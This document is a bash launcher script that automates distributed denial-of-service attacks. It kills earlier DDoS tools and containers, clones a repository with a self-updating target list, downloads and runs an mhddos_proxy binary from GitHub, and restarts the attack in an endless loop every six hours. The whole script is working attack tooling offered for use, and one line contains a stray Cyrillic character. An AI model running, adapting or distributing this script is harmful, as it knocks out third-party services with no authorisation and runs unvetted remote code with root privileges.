#!/bin/bash

restart_interval="6h"

#Just in case kill previous copy of mhddos_proxy and finder
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
sudo pkill -e -f runner.py
sudo pkill -e -f finder.py
sudo pkill -e -f db1000n
sudo pkill -e -f Disbalancer
sudo pkill -e -f disbalancer
sudo pkill -e -f Cyber
sudo docker kill $(sudo docker ps -aqf ancestor=elwahab/dd-attack)
sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/opengs/uashield:latest)
sudo pkill -e -f mhddos   


sleep 1s
cd ~
sudo apt update -y
sudo apt install --upgrade git curl python3 python3-pip -y
sudo git clone https://github.com/alexnest-ua/auto_mhddos_alexnest
sudo chown -R ${USER}:${USER} ~/auto_mhddos_alexnest
sudo chown -R ${USER}:${USER} /home/${USER}/auto_mhddos_alexnest
sudo git config --global --add safe.directory ~/auto_mhddos_alexnest
sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest


сd ~
curl -Lo mhddos_proxy_linux https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
chmod +x mhddos_proxy_linux


# Restarts attacks and update targets list every 20 minutes
while [ 1 == 1 ]
do
        cd ~/auto_mhddos_alexnest
   	num=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num"   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh
	fi
	   	
	cd ~
        ./mhddos_proxy_linux&
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update in $restart_interval ...\033[1;0m"

	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
   	sudo pkill -e -f runner.py
	sudo pkill -e -f finder.py
	sudo pkill -e -f db1000n
	sudo pkill -e -f Disbalancer
	sudo pkill -e -f disbalancer
	sudo pkill -e -f Cyber
	sudo docker kill $(sudo docker ps -aqf ancestor=elwahab/dd-attack)
	sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/opengs/uashield:latest)
        sudo pkill -e -f mhddos
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
done
